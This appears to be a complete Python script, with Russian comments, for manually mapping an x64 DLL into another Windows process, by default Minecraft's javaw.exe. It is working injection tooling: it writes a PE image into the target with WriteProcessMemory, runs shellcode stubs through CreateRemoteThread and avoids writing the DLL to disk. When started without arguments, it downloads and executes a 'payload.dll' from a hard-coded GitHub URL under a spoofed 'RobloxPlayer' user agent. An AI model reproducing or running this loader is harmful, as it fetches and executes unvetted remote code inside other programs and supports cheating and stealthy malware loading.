#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
inject.py - самостоятельный Python-инжектор x64 DLL в процесс игры.

Аналог режима "подкачки" из loader.cpp:
  * DLL можно скачать по http(s):// или прочитать с диска;
  * образ PE разбирается в памяти;
  * ручной маппинг: VirtualAllocEx, релокации, импорты, TLS, DllMain;
  * LoadLibraryW по файлу не используется, на диск ничего не пишется.

Требования:
  * 64-битный Python;
  * 64-битная DLL (x64) и 64-битный целевой процесс (javaw.exe);
  * для процесса, запущенного от админа, Python тоже нужен от админа.

Примеры:
  python inject.py --url https://example.com/payload.dll
  python inject.py --dll C:\\path\\payload.dll --pid 12345
  python inject.py --dll payload.dll --process javaw.exe

Без --pid/--process скрипт ищет окно Minecraft (GLFW/LWJGL) и берёт javaw.exe.
"""

import argparse
import ctypes
import ctypes.wintypes as wt
import os
import platform
import ssl
import struct
import sys
import urllib.request

# --------------------------------------------------------------------------
# Win32
# --------------------------------------------------------------------------
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
user32 = ctypes.WinDLL("user32", use_last_error=True)

PROCESS_CREATE_THREAD = 0x0002
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000

TH32CS_SNAPPROCESS = 0x00000002
TH32CS_SNAPMODULE = 0x00000008
TH32CS_SNAPMODULE32 = 0x00000010

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000

PAGE_NOACCESS = 0x01
PAGE_READONLY = 0x02
PAGE_READWRITE = 0x04
PAGE_EXECUTE = 0x10
PAGE_EXECUTE_READ = 0x20
PAGE_EXECUTE_READWRITE = 0x40

WAIT_TIMEOUT = 0x102
INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value

# Значения по умолчанию: срабатывают, если скрипт запущен без аргументов.
# Впиши сюда свой URL (тогда DLL вообще не нужна на диске) или путь к DLL.
DEFAULT_URL = "https://raw.githubusercontent.com/worex432-prog/Roblox/main/payload.dll"
DEFAULT_DLL = ""

IMAGE_SCN_MEM_EXECUTE = 0x20000000
IMAGE_SCN_MEM_READ = 0x40000000
IMAGE_SCN_MEM_WRITE = 0x80000000
IMAGE_FILE_DLL = 0x2000


class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize", wt.DWORD),
        ("cntUsage", wt.DWORD),
        ("th32ProcessID", wt.DWORD),
        ("th32DefaultHeapID", ctypes.c_void_p),
        ("th32ModuleID", wt.DWORD),
        ("cntThreads", wt.DWORD),
        ("th32ParentProcessID", wt.DWORD),
        ("pcPriClassBase", ctypes.c_long),
        ("dwFlags", wt.DWORD),
        ("szExeFile", wt.WCHAR * 260),
    ]


class MODULEENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize", wt.DWORD),
        ("th32ModuleID", wt.DWORD),
        ("th32ProcessID", wt.DWORD),
        ("GlblcntUsage", wt.DWORD),
        ("ProccntUsage", wt.DWORD),
        ("modBaseAddr", ctypes.c_void_p),
        ("modBaseSize", wt.DWORD),
        ("hModule", wt.HMODULE),
        ("szModule", wt.WCHAR * 256),
        ("szExePath", wt.WCHAR * 260),
    ]


class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", wt.DWORD),
        ("PartitionId", wt.WORD),
        ("__alignment1", wt.WORD),
        ("RegionSize", ctypes.c_size_t),
        ("State", wt.DWORD),
        ("Protect", wt.DWORD),
        ("Type", wt.DWORD),
        ("__alignment2", wt.DWORD),
    ]


WNDENUMPROC = ctypes.WINFUNCTYPE(wt.BOOL, wt.HWND, wt.LPARAM)

kernel32.OpenProcess.restype = wt.HANDLE
kernel32.OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]
kernel32.CloseHandle.argtypes = [wt.HANDLE]

kernel32.CreateToolhelp32Snapshot.restype = wt.HANDLE
kernel32.CreateToolhelp32Snapshot.argtypes = [wt.DWORD, wt.DWORD]
kernel32.Process32FirstW.argtypes = [wt.HANDLE, ctypes.POINTER(PROCESSENTRY32W)]
kernel32.Process32NextW.argtypes = [wt.HANDLE, ctypes.POINTER(PROCESSENTRY32W)]
kernel32.Module32FirstW.argtypes = [wt.HANDLE, ctypes.POINTER(MODULEENTRY32W)]
kernel32.Module32NextW.argtypes = [wt.HANDLE, ctypes.POINTER(MODULEENTRY32W)]

kernel32.VirtualAllocEx.restype = ctypes.c_void_p
kernel32.VirtualAllocEx.argtypes = [wt.HANDLE, ctypes.c_void_p,
                                    ctypes.c_size_t, wt.DWORD, wt.DWORD]
kernel32.VirtualFreeEx.restype = wt.BOOL
kernel32.VirtualFreeEx.argtypes = [wt.HANDLE, ctypes.c_void_p,
                                   ctypes.c_size_t, wt.DWORD]
kernel32.VirtualProtectEx.restype = wt.BOOL
kernel32.VirtualProtectEx.argtypes = [wt.HANDLE, ctypes.c_void_p,
                                      ctypes.c_size_t, wt.DWORD,
                                      ctypes.POINTER(wt.DWORD)]
kernel32.WriteProcessMemory.restype = wt.BOOL
kernel32.WriteProcessMemory.argtypes = [wt.HANDLE, ctypes.c_void_p,
                                        ctypes.c_void_p, ctypes.c_size_t,
                                        ctypes.POINTER(ctypes.c_size_t)]
kernel32.ReadProcessMemory.restype = wt.BOOL
kernel32.ReadProcessMemory.argtypes = [wt.HANDLE, ctypes.c_void_p,
                                       ctypes.c_void_p, ctypes.c_size_t,
                                       ctypes.POINTER(ctypes.c_size_t)]
kernel32.CreateRemoteThread.restype = wt.HANDLE
kernel32.CreateRemoteThread.argtypes = [wt.HANDLE, ctypes.c_void_p,
                                        ctypes.c_size_t, ctypes.c_void_p,
                                        ctypes.c_void_p, wt.DWORD,
                                        ctypes.POINTER(wt.DWORD)]
kernel32.WaitForSingleObject.restype = wt.DWORD
kernel32.WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]
kernel32.GetExitCodeThread.restype = wt.BOOL
kernel32.GetExitCodeThread.argtypes = [wt.HANDLE, ctypes.POINTER(wt.DWORD)]

kernel32.LoadLibraryA.restype = wt.HMODULE
kernel32.LoadLibraryA.argtypes = [wt.LPCSTR]
kernel32.GetProcAddress.restype = ctypes.c_void_p
kernel32.GetProcAddress.argtypes = [wt.HMODULE, wt.LPCSTR]
kernel32.GetModuleFileNameW.restype = wt.DWORD
kernel32.GetModuleFileNameW.argtypes = [wt.HMODULE, wt.LPWSTR, wt.DWORD]
kernel32.VirtualQuery.restype = ctypes.c_size_t
kernel32.VirtualQuery.argtypes = [ctypes.c_void_p,
                                  ctypes.POINTER(MEMORY_BASIC_INFORMATION),
                                  ctypes.c_size_t]
kernel32.IsWow64Process.restype = wt.BOOL
kernel32.IsWow64Process.argtypes = [wt.HANDLE, ctypes.POINTER(wt.BOOL)]
kernel32.QueryFullProcessImageNameW.restype = wt.BOOL
kernel32.QueryFullProcessImageNameW.argtypes = [wt.HANDLE, wt.DWORD,
                                                wt.LPWSTR,
                                                ctypes.POINTER(wt.DWORD)]

user32.IsWindowVisible.argtypes = [wt.HWND]
user32.GetClassNameW.argtypes = [wt.HWND, wt.LPWSTR, ctypes.c_int]
user32.GetWindowTextW.argtypes = [wt.HWND, wt.LPWSTR, ctypes.c_int]
user32.GetWindowThreadProcessId.argtypes = [wt.HWND,
                                            ctypes.POINTER(wt.DWORD)]
user32.EnumWindows.argtypes = [WNDENUMPROC, wt.LPARAM]


# --------------------------------------------------------------------------
# Вспомогательное
# --------------------------------------------------------------------------
def die(msg):
    print("[-] " + msg, file=sys.stderr)
    sys.exit(1)


def proc_image_name(pid):
    h = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
    if not h:
        return ""
    buf = ctypes.create_unicode_buffer(1024)
    size = wt.DWORD(1024)
    ok = kernel32.QueryFullProcessImageNameW(h, 0, buf, ctypes.byref(size))
    kernel32.CloseHandle(h)
    return buf.value if ok else ""


def find_pid_by_name(name):
    snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if not snap or snap == INVALID_HANDLE_VALUE:
        return 0
    pe = PROCESSENTRY32W()
    pe.dwSize = ctypes.sizeof(pe)
    pid = 0
    if kernel32.Process32FirstW(snap, ctypes.byref(pe)):
        while True:
            if pe.szExeFile.lower() == name.lower():
                pid = pe.th32ProcessID
                break
            if not kernel32.Process32NextW(snap, ctypes.byref(pe)):
                break
    kernel32.CloseHandle(snap)
    return pid


def find_minecraft_window():
    found = []

    @WNDENUMPROC
    def callback(hwnd, _lparam):
        if not user32.IsWindowVisible(hwnd):
            return True
        cls = ctypes.create_unicode_buffer(256)
        title = ctypes.create_unicode_buffer(512)
        user32.GetClassNameW(hwnd, cls, 256)
        user32.GetWindowTextW(hwnd, title, 512)
        looks_like = ("GLFW" in cls.value or "LWJGL" in cls.value or
                      "minecraft" in title.value.lower())
        if not looks_like:
            return True
        pid = wt.DWORD()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        exe = os.path.basename(proc_image_name(pid.value)).lower()
        if exe in ("javaw.exe", "java.exe"):
            found.append(pid.value)
            return False
        return True

    user32.EnumWindows(callback, 0)
    return found[0] if found else 0


def enum_modules(pid):
    mods = {}
    snap = kernel32.CreateToolhelp32Snapshot(
        TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid)
    if not snap or snap == INVALID_HANDLE_VALUE:
        return mods
    me = MODULEENTRY32W()
    me.dwSize = ctypes.sizeof(me)
    if kernel32.Module32FirstW(snap, ctypes.byref(me)):
        while True:
            mods[me.szModule.lower()] = int(me.modBaseAddr or 0)
            if not kernel32.Module32NextW(snap, ctypes.byref(me)):
                break
    kernel32.CloseHandle(snap)
    return mods


def local_module_of(address):
    """Имя модуля и его база для адреса в НАШЕМ процессе."""
    mbi = MEMORY_BASIC_INFORMATION()
    if not kernel32.VirtualQuery(ctypes.c_void_p(address),
                                 ctypes.byref(mbi), ctypes.sizeof(mbi)):
        return "", 0
    base = int(mbi.AllocationBase or 0)
    buf = ctypes.create_unicode_buffer(1024)
    if not base or not kernel32.GetModuleFileNameW(
            wt.HMODULE(base), buf, 1024):
        return "", 0
    return os.path.basename(buf.value).lower(), base


def read_remote(hproc, address, size):
    buf = ctypes.create_string_buffer(size)
    got = ctypes.c_size_t(0)
    ok = kernel32.ReadProcessMemory(
        hproc, ctypes.c_void_p(address), buf, size, ctypes.byref(got))
    if not ok or got.value != size:
        raise RuntimeError("ReadProcessMemory 0x%X (%d байт): %d"
                           % (address, size, ctypes.get_last_error()))
    return buf.raw[:size]


def read_remote_cstring(hproc, address, maxlen=512):
    data = b""
    while len(data) < maxlen:
        chunk = read_remote(hproc, address + len(data),
                            min(64, maxlen - len(data)))
        zero = chunk.find(b"\0")
        if zero >= 0:
            return (data + chunk[:zero]).decode("ascii", "replace")
        data += chunk
    return data.decode("ascii", "replace")


def find_remote_module(modules, name):
    key = name.lower()
    if key in modules:
        return modules[key]
    if key + ".dll" in modules:
        return modules[key + ".dll"]
    return 0


def remote_get_proc(hproc, modules, dll_name, name=None, ordinal=None,
                    depth=0):
    """Адрес экспорта, прочитанный из PE-образа модуля в целевом процессе."""
    if depth > 8:
        raise RuntimeError("слишком длинная цепочка forwarder-ов")
    base = find_remote_module(modules, dll_name)
    if not base:
        raise RuntimeError("в целевом процессе нет модуля " + dll_name)

    e_lfanew = struct.unpack_from("<I", read_remote(hproc, base, 0x40), 0x3C)[0]
    nt = read_remote(hproc, base + e_lfanew, 4 + 20 + 240)
    if nt[:4] != b"PE\0\0":
        raise RuntimeError("битый PE у модуля " + dll_name)
    opt = 24
    export_rva, export_size = struct.unpack_from("<II", nt, opt + 112)
    if not export_rva:
        raise RuntimeError("у модуля " + dll_name + " нет таблицы экспорта")

    ed = read_remote(hproc, base + export_rva, 40)
    ordinal_base = struct.unpack_from("<I", ed, 16)[0]
    num_funcs = struct.unpack_from("<I", ed, 20)[0]
    num_names = struct.unpack_from("<I", ed, 24)[0]
    addr_funcs = struct.unpack_from("<I", ed, 28)[0]
    addr_names = struct.unpack_from("<I", ed, 32)[0]
    addr_ords = struct.unpack_from("<I", ed, 36)[0]

    index = None
    if name is not None:
        names = read_remote(hproc, base + addr_names, 4 * num_names)
        for i in range(num_names):
            name_rva = struct.unpack_from("<I", names, 4 * i)[0]
            if read_remote_cstring(hproc, base + name_rva) == name:
                index = struct.unpack_from(
                    "<H", read_remote(hproc, base + addr_ords + 2 * i, 2))[0]
                break
    elif ordinal is not None:
        index = ordinal - ordinal_base
    if index is None or index >= num_funcs:
        what = name if name is not None else ("#%d" % ordinal)
        raise RuntimeError("экспорт %s не найден в %s" % (what, dll_name))

    func_rva = struct.unpack_from(
        "<I", read_remote(hproc, base + addr_funcs + 4 * index, 4))[0]
    if export_rva <= func_rva < export_rva + export_size:
        forwarder = read_remote_cstring(hproc, base + func_rva)
        if "." not in forwarder:
            raise RuntimeError("битый forwarder: " + forwarder)
        target_dll, target_fn = forwarder.rsplit(".", 1)
        if target_fn.startswith("#"):
            return remote_get_proc(hproc, modules, target_dll,
                                   ordinal=int(target_fn[1:]), depth=depth + 1)
        return remote_get_proc(hproc, modules, target_dll,
                               name=target_fn, depth=depth + 1)
    return base + func_rva


def section_protection(chars):
    x = bool(chars & IMAGE_SCN_MEM_EXECUTE)
    r = bool(chars & IMAGE_SCN_MEM_READ)
    w = bool(chars & IMAGE_SCN_MEM_WRITE)
    if x:
        return PAGE_EXECUTE_READWRITE if w else (
            PAGE_EXECUTE_READ if r else PAGE_EXECUTE)
    return PAGE_READWRITE if w else (PAGE_READONLY if r else PAGE_NOACCESS)


# --------------------------------------------------------------------------
# PE
# --------------------------------------------------------------------------
class PE:
    def __init__(self, raw):
        if len(raw) < 0x40 or raw[:2] != b"MZ":
            raise ValueError("нет MZ-заголовка")
        self.raw = raw
        self.e_lfanew = struct.unpack_from("<I", raw, 0x3C)[0]
        if raw[self.e_lfanew:self.e_lfanew + 4] != b"PE\0\0":
            raise ValueError("нет PE-подписи")
        coff = self.e_lfanew + 4
        self.machine, self.nsections = struct.unpack_from("<HH", raw, coff)
        self.size_optional = struct.unpack_from("<H", raw, coff + 16)[0]
        self.characteristics = struct.unpack_from("<H", raw, coff + 18)[0]
        self.opt = coff + 20
        self.magic = struct.unpack_from("<H", raw, self.opt)[0]
        if self.magic != 0x20B:
            raise ValueError("нужна x64 DLL (PE32+)")
        if self.machine != 0x8664:
            raise ValueError("machine != x64")
        if not (self.characteristics & IMAGE_FILE_DLL):
            raise ValueError("это не DLL")
        self.entry = struct.unpack_from("<I", raw, self.opt + 16)[0]
        self.image_base = struct.unpack_from("<Q", raw, self.opt + 24)[0]
        self.size_of_image = struct.unpack_from("<I", raw, self.opt + 56)[0]
        self.size_of_headers = struct.unpack_from("<I", raw, self.opt + 60)[0]
        self.num_dirs = struct.unpack_from("<I", raw, self.opt + 108)[0]
        self.dirs = []
        for i in range(min(self.num_dirs, 16)):
            self.dirs.append(struct.unpack_from("<II", raw,
                                                self.opt + 112 + 8 * i))
        while len(self.dirs) < 16:
            self.dirs.append((0, 0))
        self.sections = []
        sec_off = self.opt + self.size_optional
        for i in range(self.nsections):
            off = sec_off + 40 * i
            name = raw[off:off + 8].rstrip(b"\0").decode("ascii", "replace")
            vsize, va = struct.unpack_from("<II", raw, off + 8)
            rsize, rptr = struct.unpack_from("<II", raw, off + 16)
            chars = struct.unpack_from("<I", raw, off + 36)[0]
            self.sections.append({
                "name": name, "vsize": vsize, "va": va,
                "rsize": rsize, "rptr": rptr, "chars": chars,
            })

    def build_image(self):
        if not (0 < self.size_of_image <= 512 * 1024 * 1024):
            raise ValueError("некорректный SizeOfImage")
        img = bytearray(self.size_of_image)
        n = min(self.size_of_headers, len(self.raw))
        img[:n] = self.raw[:n]
        for s in self.sections:
            if not s["rsize"] or s["va"] >= self.size_of_image:
                continue
            if s["rptr"] >= len(self.raw):
                continue
            ln = min(s["rsize"], len(self.raw) - s["rptr"],
                     self.size_of_image - s["va"])
            img[s["va"]:s["va"] + ln] = \
                self.raw[s["rptr"]:s["rptr"] + ln]
        return img


def apply_relocations(img, pe, delta):
    if not delta:
        return
    rva, size = pe.dirs[5]
    if not rva or not size or rva + size > len(img):
        return
    pos = 0
    while pos + 8 <= size:
        block_va, block_size = struct.unpack_from("<II", img, rva + pos)
        if not block_size or pos + block_size > size:
            break
        count = (block_size - 8) // 2
        for i in range(count):
            entry = struct.unpack_from("<H", img, rva + pos + 8 + 2 * i)[0]
            rtype = entry >> 12
            off = entry & 0x0FFF
            p = block_va + off
            if rtype == 0:      # ABSOLUTE
                continue
            if rtype == 10:     # DIR64
                if p + 8 > len(img):
                    raise ValueError("релокация вне образа")
                val = struct.unpack_from("<Q", img, p)[0]
                struct.pack_into("<Q", img, p,
                                 (val + delta) & 0xFFFFFFFFFFFFFFFF)
            elif rtype == 3:    # HIGHLOW
                if p + 4 > len(img):
                    raise ValueError("релокация вне образа")
                val = struct.unpack_from("<I", img, p)[0]
                struct.pack_into("<I", img, p, (val + delta) & 0xFFFFFFFF)
        pos += block_size


def cstring(img, offset):
    end = img.find(b"\0", offset)
    if end < 0:
        return ""
    return img[offset:end].decode("ascii", "replace")


API_SET_HOSTS = ("ucrtbase.dll", "kernelbase.dll", "kernel32.dll")


def is_api_set(dll):
    low = dll.lower()
    return low.startswith("api-ms-") or low.startswith("ext-ms-")


def remote_load_library(hproc, pid, modules, dll):
    """Подгружает DLL в целевой процесс через LoadLibraryA из его kernel32."""
    load_fn = remote_get_proc(hproc, modules, "kernel32.dll", name="LoadLibraryA")
    data = dll.encode("ascii") + b"\0"
    mem = kernel32.VirtualAllocEx(hproc, None, len(data),
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not mem:
        raise RuntimeError("VirtualAllocEx под имя DLL: %d" % ctypes.get_last_error())
    try:
        written = ctypes.c_size_t()
        buf = (ctypes.c_ubyte * len(data)).from_buffer_copy(data)
        if not kernel32.WriteProcessMemory(hproc, mem, buf, len(data),
                                           ctypes.byref(written)):
            raise RuntimeError("WriteProcessMemory под имя DLL: %d"
                               % ctypes.get_last_error())
        call_remote(hproc, mem, 0, 0, load_fn)
    finally:
        kernel32.VirtualFreeEx(hproc, mem, 0, MEM_RELEASE)
    modules.update(enum_modules(pid))
    if not find_remote_module(modules, dll):
        raise RuntimeError("не удалось загрузить %s в процесс "
                           "(нет в системе или не хватает зависимостей; "
                           "поставь VC++ 2015-2022 x64 redistributable)" % dll)


def resolve_fn(hproc, modules, dll, name=None, ordinal=None):
    """Адрес импорта. Для api-ms-* ищем экспорт во всех модулях процесса:
    api-set может жить в combase, ucrtbase, kernelbase, ole32 и т.д."""
    if not is_api_set(dll):
        return remote_get_proc(hproc, modules, dll, name=name, ordinal=ordinal)
    hosts = [h for h in API_SET_HOSTS if h in modules] + \
            [m for m in modules if m not in API_SET_HOSTS and m.endswith(".dll")]
    last = None
    for host in hosts:
        try:
            return remote_get_proc(hproc, modules, host, name=name, ordinal=ordinal)
        except RuntimeError as e:
            last = e
    raise RuntimeError("api-set %s: экспорт не найден ни в одном модуле процесса (%s)"
                       % (dll, last))


def resolve_imports(img, pe, hproc, pid, remote_modules):
    rva, size = pe.dirs[1]
    if not rva or not size:
        return
    desc_off = rva
    guard = 0
    while desc_off + 20 <= len(img):
        guard += 1
        if guard > 1024:
            raise ValueError("слишком много DLL в импортах")
        oft, _ts, _fc, name_rva, ft = struct.unpack_from(
            "<IIIII", img, desc_off)
        if not name_rva:
            break
        dll = cstring(img, name_rva)
        if not is_api_set(dll) and not find_remote_module(remote_modules, dll):
            remote_load_library(hproc, pid, remote_modules, dll)

        thunk_off = oft or ft
        while thunk_off + 8 <= len(img):
            value = struct.unpack_from("<Q", img, thunk_off)[0]
            if not value:
                break
            if value & 0x8000000000000000:
                remote_fn = resolve_fn(hproc, remote_modules, dll,
                                       ordinal=value & 0xFFFF)
            else:
                remote_fn = resolve_fn(hproc, remote_modules, dll,
                                       name=cstring(img, value + 2))
            struct.pack_into("<Q", img, ft, remote_fn)

            thunk_off += 8
            ft += 8
        desc_off += 20


# --------------------------------------------------------------------------
# Удалённый вызов функции
# --------------------------------------------------------------------------
def call_remote(hproc, a1, a2, a3, fn, timeout=15000):
    # mov rcx,a1; mov rdx,a2; mov r8,a3; mov rax,fn; sub rsp,28; call rax; ...
    stub = (b"\x48\xB9" + struct.pack("<Q", a1) +
            b"\x48\xBA" + struct.pack("<Q", a2) +
            b"\x49\xB8" + struct.pack("<Q", a3) +
            b"\x48\xB8" + struct.pack("<Q", fn) +
            b"\x48\x83\xEC\x28"
            b"\xFF\xD0"
            b"\x48\x83\xC4\x28"
            b"\xC3")

    code = kernel32.VirtualAllocEx(
        hproc, None, len(stub), MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE)
    if not code:
        raise RuntimeError("VirtualAllocEx для стаба: %d" %
                           ctypes.get_last_error())
    written = ctypes.c_size_t()
    buf = (ctypes.c_ubyte * len(stub)).from_buffer_copy(stub)
    if not kernel32.WriteProcessMemory(hproc, code, buf, len(stub),
                                       ctypes.byref(written)):
        kernel32.VirtualFreeEx(hproc, code, 0, MEM_RELEASE)
        raise RuntimeError("WriteProcessMemory для стаба: %d" %
                           ctypes.get_last_error())
    th = kernel32.CreateRemoteThread(hproc, None, 0, code, None, 0, None)
    if not th:
        kernel32.VirtualFreeEx(hproc, code, 0, MEM_RELEASE)
        raise RuntimeError("CreateRemoteThread: %d" % ctypes.get_last_error())
    wait = kernel32.WaitForSingleObject(th, timeout)
    code_exit = wt.DWORD(0)
    kernel32.GetExitCodeThread(th, ctypes.byref(code_exit))
    kernel32.CloseHandle(th)
    kernel32.VirtualFreeEx(hproc, code, 0, MEM_RELEASE)
    if wait == WAIT_TIMEOUT:
        raise RuntimeError("функция не ответила за %d мс" % timeout)
    return code_exit.value


# --------------------------------------------------------------------------
# Ручной маппинг
# --------------------------------------------------------------------------
def manual_map(pid, raw):
    pe = PE(raw)
    img = pe.build_image()

    print("[*] Цель PID %d, образ %d байт, ImageBase 0x%X"
          % (pid, pe.size_of_image, pe.image_base))

    wow = wt.BOOL(0)
    hp = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
    if hp:
        kernel32.IsWow64Process(hp, ctypes.byref(wow))
        kernel32.CloseHandle(hp)
    if wow.value:
        raise RuntimeError("целевой процесс 32-битный (WOW64), нужна x64 игра")

    hproc = kernel32.OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        False, pid)
    if not hproc:
        raise RuntimeError("OpenProcess: %d (запусти Python от администратора)"
                           % ctypes.get_last_error())

    try:
        remote = None
        if not os.environ.get("INJECT_FORCE_REBASE"):
            remote = kernel32.VirtualAllocEx(
                hproc, ctypes.c_void_p(pe.image_base), pe.size_of_image,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if not remote:
            remote = kernel32.VirtualAllocEx(
                hproc, None, pe.size_of_image,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if not remote:
            raise RuntimeError("VirtualAllocEx: %d" % ctypes.get_last_error())

        delta = remote - pe.image_base
        print("[*] Образ размещён по 0x%X (delta 0x%X)" % (remote, delta))

        apply_relocations(img, pe, delta)
        remote_modules = enum_modules(pid)
        if not remote_modules:
            raise RuntimeError("не удалось перечислить модули процесса")
        resolve_imports(img, pe, hproc, pid, remote_modules)

        written = ctypes.c_size_t()
        buf = (ctypes.c_ubyte * len(img)).from_buffer(img)
        if not kernel32.WriteProcessMemory(hproc, remote, buf, len(img),
                                           ctypes.byref(written)):
            raise RuntimeError("WriteProcessMemory: %d" % ctypes.get_last_error())
        if written.value != len(img):
            raise RuntimeError("записано %d из %d байт"
                               % (written.value, len(img)))

        old = wt.DWORD(0)
        kernel32.VirtualProtectEx(hproc, remote, pe.size_of_headers,
                                  PAGE_READONLY, ctypes.byref(old))
        for s in pe.sections:
            ln = max(s["vsize"], s["rsize"])
            if not ln or s["va"] >= pe.size_of_image:
                continue
            ln = min(ln, pe.size_of_image - s["va"])
            kernel32.VirtualProtectEx(
                hproc, ctypes.c_void_p(remote + s["va"]), ln,
                section_protection(s["chars"]), ctypes.byref(old))

        # TLS-колбэки
        tls_rva, tls_size = pe.dirs[9]
        if tls_rva and tls_rva + 32 <= len(img):
            callbacks_va = struct.unpack_from("<Q", img, tls_rva + 24)[0]
            if callbacks_va > remote:
                off = callbacks_va - remote
                for _ in range(64):
                    if off + 8 > len(img):
                        break
                    cb = struct.unpack_from("<Q", img, off)[0]
                    if not cb:
                        break
                    try:
                        call_remote(hproc, remote, 1, 0, cb)
                    except RuntimeError as e:
                        print("[!] TLS-колбэк: %s" % e)
                        break
                    off += 8

        if pe.entry:
            code = call_remote(hproc, remote, 1, 0, remote + pe.entry)
            if code == 0:
                raise RuntimeError("DllMain вернул FALSE")
        print("[+] DLL загружена в память PID %d" % pid)
    finally:
        kernel32.CloseHandle(hproc)


# --------------------------------------------------------------------------
# Загрузка нагрузки
# --------------------------------------------------------------------------
def download(url, max_bytes=256 * 1024 * 1024):
    if not url.lower().startswith(("http://", "https://")):
        raise ValueError("URL должен начинаться с http:// или https://")
    req = urllib.request.Request(url, headers={
        "User-Agent": "RobloxPlayer/1.0",
        "Accept": "application/octet-stream",
    })
    ctx = ssl.create_default_context()
    with urllib.request.urlopen(req, timeout=60, context=ctx) as resp:
        data = resp.read(max_bytes + 1)
    if len(data) > max_bytes:
        raise ValueError("файл больше %d байт" % max_bytes)
    if not data:
        raise ValueError("сервер вернул пустой ответ")
    return data


def main():
    ap = argparse.ArgumentParser(
        description="Python-инжектор x64 DLL (ручной маппинг в память)")
    src = ap.add_mutually_exclusive_group(required=False)
    src.add_argument("--url", help="скачать DLL по http(s)://")
    src.add_argument("--dll", help="локальный путь к DLL")
    ap.add_argument("--pid", type=int, help="PID целевого процесса")
    ap.add_argument("--process", help="имя процесса, например javaw.exe")
    args = ap.parse_args()

    url = args.url
    dll = args.dll
    if not url and not dll:
        if DEFAULT_URL:
            url = DEFAULT_URL
        elif DEFAULT_DLL:
            dll = DEFAULT_DLL
    if not url and not dll:
        die("укажи --url/--dll или впиши DEFAULT_URL/DEFAULT_DLL в inject.py")

    if platform.architecture()[0] != "64bit":
        die("нужен 64-битный Python")
    if os.name != "nt":
        die("только Windows")

    if args.pid:
        pid = args.pid
    elif args.process:
        pid = find_pid_by_name(args.process)
    else:
        pid = find_minecraft_window()
    if not pid:
        die("процесс не найден: укажи --pid или --process")
    print("[*] Процесс: %s (PID %d)" %
          (os.path.basename(proc_image_name(pid)), pid))

    try:
        if url:
            print("[*] Скачиваю %s" % url)
            raw = download(url)
        else:
            with open(dll, "rb") as f:
                raw = f.read()
        print("[*] Получено %d байт" % len(raw))
        manual_map(pid, raw)
    except (ValueError, RuntimeError, OSError) as e:
        die(str(e))


if __name__ == "__main__":
    main()
